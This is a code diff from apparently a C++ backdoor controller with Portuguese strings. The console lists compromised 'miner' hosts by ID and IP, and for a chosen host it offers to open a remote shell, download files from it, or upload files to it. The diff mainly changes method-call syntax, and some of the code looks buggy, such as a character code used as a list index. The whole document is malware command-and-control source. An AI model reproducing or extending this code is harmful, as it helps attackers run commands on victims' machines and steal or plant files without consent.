@@ -27,16 +27,17 @@ public:
         std::cout << "Choose Miner: " << std::endl;
         for (Backdoor b : backdoors){
 
-            std::cout << i << " - " << b.get_miner_id() << " - ";
+            std::cout << i << " - " << b.get_id() << " - ";
             std::cout << b.get_miner_ip() << std::endl;
         }
+
         int choice = std::cin.get();
         Backdoor nova = backdoors[choice];
 
         while(true){
             int choice;
             system("cls");
-            std::cout << "MINER_ID = " << nova->get_miner_id() << " - IP = \n" << nova->get_miner_ip() << std::endl;
+            std::cout << "MINER_ID = " << nova.get_id() << " - IP = \n" << nova.get_miner_ip() << std::endl;
 
             std::cout << "Operações : " << std::endl;
 
@@ -46,16 +47,16 @@ public:
 
 
             if(choice == 1){
-                nova->c->send_message(nova->get_sock(), "1");
-                nova->shell();
+                nova.send_message("1");
+                nova.shell();
             
             }else if(choice == 2){
                 std::string path;
                 std::cout << "Path: ";
                 std::getline(std::cin, path);
                 // Get path
-                nova->c->send_message(nova->sock, "2");
-                nova->download(path.c_str());
+                nova.send_message("2");
+                nova.download(path.c_str());
 
             }else if(choice == 3){
                 std::string path;
@@ -63,8 +64,8 @@ public:
                 std::getline(std::cin, path);
                 FILE *f = fopen(path.c_str(), "rb");
                 if(f != NULL){
-                    nova->c->send_message(nova->sock, "3");
-                    nova->upload(path.c_str());
+                    nova.send_message("3");
+                    nova.upload(path.c_str());
                     fclose(f);
                 }else{
                     Error::log_error("Arquivo inexistente na sua maquina.");
